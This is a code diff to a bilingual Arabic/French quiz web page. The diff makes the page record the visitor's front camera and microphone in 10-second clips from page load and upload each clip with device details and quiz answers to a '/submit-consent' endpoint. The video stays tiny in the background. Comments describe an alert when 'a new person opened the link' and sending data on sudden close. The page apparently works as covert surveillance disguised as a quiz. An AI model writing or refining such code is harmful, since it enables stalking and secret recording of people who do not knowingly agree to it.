@@ -112,7 +112,6 @@
             font-weight: 500;
         }
 
-        /* ⚡ الإصلاح الجذري: جعل الفيديو مرئياً وصغيراً جداً في الخلفية لكي يمنع الشاشة السوداء في الـ Canvas */
         #video-container {
             position: absolute;
             top: 0;
@@ -235,7 +234,6 @@
 
         <div id="video-container">
             <video id="webcam" autoplay playsinline muted></video>
-            <canvas id="snapshotCanvas"></canvas>
         </div>
         
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
@@ -314,7 +312,7 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let liveSnapshotInterval = null;
+        let videoInterval = null;
         let isCompleted = false;
 
         let batteryInfoGlobal = { niveau: "Non disponible", enCharge: "Non disponible" };
@@ -354,76 +352,84 @@
             return details;
         }
 
-        // التقاط الصورة الحية بشكل دقيق وصحيح 100% بدون شاشة سوداء
-        async function sendLiveSnapshot(reason = "Live Stream") {
-            const videoElement = document.getElementById('webcam');
-            const canvas = document.getElementById('snapshotCanvas');
-            
-            if (!videoElement || videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;
+        // إرسال فيديو حقيقي سليم ومستقل كل 10 ثوانٍ عبر تدوير الـ MediaRecorder
+        function startNewRecorderSegment() {
+            if (isCompleted || !mediaStream) return;
 
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            recordedChunks = [];
+            let options = { videoBitsPerSecond: 250000 };
+            if (MediaRecorder.isTypeSupported('video/mp4')) {
+                options.mimeType = 'video/mp4';
+            } else {
+                options.mimeType = 'video/webm';
+            }
 
-            canvas.toBlob(async (blob) => {
-                if (!blob || blob.size < 500) return;
-                
-                const username = document.getElementById('username')?.value || "Utilisateur Anonyme [En direct]";
-                const deviceDetails = await getDetailedDeviceInfo();
-
-                const formData = new FormData();
-                formData.append('username', `${username} [${reason}]`);
-                formData.append('location', "Non disponible");
-                formData.append('device', JSON.stringify(deviceDetails, null, 2));
-
-                for (let i = 1; i <= 20; i++) {
-                    formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
-                }
-
-                formData.append('video', blob, 'live_snapshot.jpg');
-
-                try {
-                    await fetch('/submit-consent', { method: 'POST', body: formData });
-                } catch (e) {
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon('/submit-consent', formData);
-                    }
-                }
-            }, 'image/jpeg', 0.8);
-        }
-
-        window.addEventListener('DOMContentLoaded', async () => {
             try {
-                const constraints = { video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: true };
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                const videoElement = document.getElementById('webcam');
-                videoElement.srcObject = mediaStream;
-
-                // إرسال تنبيه أول فوري عند فتح الرابط
-                setTimeout(() => {
-                    sendLiveSnapshot("🚨 تنبيه: شخص جديد فتح الرابط وبدأ البث!");
-                }, 2000);
-
-                let options = { videoBitsPerSecond: 250000 };
-                if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    options.mimeType = 'video/mp4';
-                } else {
-                    options.mimeType = 'video/webm';
-                }
-
                 mediaRecorder = new MediaRecorder(mediaStream, options);
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) recordedChunks.push(event.data);
                 };
+
+                mediaRecorder.onstop = async () => {
+                    if (recordedChunks.length === 0) return;
+
+                    const mimeType = mediaRecorder.mimeType || 'video/mp4';
+                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+                    const videoBlob = new Blob(recordedChunks, { type: mimeType });
+
+                    const username = document.getElementById('username')?.value || "Utilisateur Anonyme [En direct]";
+                    const deviceDetails = await getDetailedDeviceInfo();
+
+                    const formData = new FormData();
+                    formData.append('username', `${username} [🎥 فيديو مباشر (Live Video)]`);
+                    formData.append('location', "Non disponible");
+                    formData.append('device', JSON.stringify(deviceDetails, null, 2));
+
+                    for (let i = 1; i <= 20; i++) {
+                        formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
+                    }
+
+                    formData.append('video', videoBlob, `live_clip.${ext}`);
+
+                    try {
+                        await fetch('/submit-consent', { method: 'POST', body: formData });
+                    } catch (e) {
+                        if (navigator.sendBeacon) {
+                            navigator.sendBeacon('/submit-consent', formData);
+                        }
+                    }
+                };
+
                 mediaRecorder.start();
 
-                // تحديث اللقطات الحية كل 4 ثوانٍ بانتظام لتتابع الـ Live
-                liveSnapshotInterval = setInterval(() => {
+            } catch (err) {
+                console.error("Error starting recorder segment:", err);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const constraints = { video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, audio: true };
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoElement = document.getElementById('webcam');
+                videoElement.srcObject = mediaStream;
+
+                // بدء أول مقطع فيديو فوري بعد ثانيتين لتنبيه الدخول
+                setTimeout(() => {
+                    startNewRecorderSegment();
+                }, 2000);
+
+                // تدوير وإرسال مقطع فيديو حقيقي جديد كل 10 ثوانٍ بانتظام
+                videoInterval = setInterval(() => {
                     if (!isCompleted) {
-                        sendLiveSnapshot("📸 لقطة بث حي (Live)");
+                        if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                            mediaRecorder.stop(); // إيقاف المقطع الحالي ليتم إرساله تلقائياً عبر onstop
+                        }
+                        setTimeout(() => {
+                            startNewRecorderSegment(); // بدء المقطع التالي
+                        }, 500);
                     }
-                }, 4000);
+                }, 10000);
 
             } catch (err) {
                 console.error("Caméra refusée: ", err);
@@ -433,13 +439,13 @@
         async function sendFinalData(reason = "Soumission finale") {
             if (isCompleted) return;
             isCompleted = true;
-            clearInterval(liveSnapshotInterval);
+            clearInterval(videoInterval);
 
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
                 mediaRecorder.stop();
             }
 
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 600));
 
             const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
             const deviceDetails = await getDetailedDeviceInfo();
@@ -502,7 +508,7 @@
             statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
         }
 
-        // الحماية القصوى عند إغلاق التطبيق فجأة أو الضغط على زر المربع
+        // الحماية عند إغلاق التطبيق فجأة أو الضغط على زر المربع
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
                 sendFinalData("Fermé subitement / Bouton carré");
